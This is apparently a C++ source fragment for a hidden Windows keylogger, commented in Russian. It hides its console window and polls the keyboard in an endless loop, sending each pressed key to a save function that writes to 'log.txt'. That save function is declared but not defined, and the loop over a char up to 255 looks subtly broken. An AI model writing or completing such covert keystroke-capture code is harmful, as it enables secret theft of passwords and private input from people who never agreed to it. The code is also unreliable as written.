#include <iostream>
#include <windows.h>


using namespace std;

int save(int _key, char *file);


int main(){
    FreeConsole();
    char i;
    while(true) {
        Sleep(10);
        for (i = 8; i <= 255; i++) { // цикл for, где мы перебираем 
         if (GetAsyncKeyState(i) == -32767) { // Если клавиша нажата
            save(i, "log.txt"); // Вызываем функцию save(сохрняет файл)
         }
      }
    }

    return 0;
}